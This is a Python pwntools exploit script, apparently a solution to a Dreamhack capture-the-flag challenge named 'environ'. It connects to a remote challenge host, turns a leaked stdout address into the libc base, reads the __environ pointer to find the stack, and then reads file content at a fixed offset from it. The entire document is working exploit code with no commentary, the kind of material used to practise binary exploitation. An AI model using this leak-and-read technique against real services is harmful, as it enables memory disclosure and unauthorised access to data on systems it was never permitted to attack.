#!/usr/bin/env python3
# Name: environ.py
from pwn import *
#p = process('./environ')
p = remote('host3.dreamhack.games', 11790)
elf = ELF('./libc.so.6')
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - elf.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + elf.symbols['__environ']
print('libc_base..', hex(libc_base))
print('libc_environ..', hex(libc_environ))
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(libc_environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6) + b'\x00' *2 )
file_content = stack_environ - 0x1568
print('stack_environ..', hex(stack_environ))
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(file_content).encode())
p.interactive()